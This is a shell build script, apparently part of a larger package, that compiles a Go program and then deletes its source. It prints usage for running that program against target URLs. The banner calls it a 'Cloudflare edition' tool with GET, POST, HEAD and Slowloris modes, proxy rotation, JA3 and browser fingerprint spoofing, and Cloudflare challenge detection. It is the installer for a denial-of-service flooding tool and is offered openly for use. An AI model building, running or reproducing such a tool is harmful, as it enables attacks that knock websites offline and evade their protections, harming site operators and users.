export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile with optimizations
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with optimizations...${NC}"
go build -ldflags="-s -w" -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE - CLOUDFLARE EDITION${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW|ALL> [options]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST proxy${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD cookies${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 SLOW proxy cookies${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 ALL${NC}"
    echo
    echo -e " ${CYAN}Features:${NC}"
    echo -e "   • JA3 signature randomization"
    echo -e "   • Browser fingerprint emulation"
    echo -e "   • Cloudflare challenge detection"
    echo -e "   • Multi-source proxy rotation"
    echo -e "   • HTTP/2 + HTTP/1.1 support"
    echo -e "   • Slowloris attack mode"
    echo -e "   • Cookie persistence"
    echo -e "   • Header randomization"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -ldflags=\"-s -w\" -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
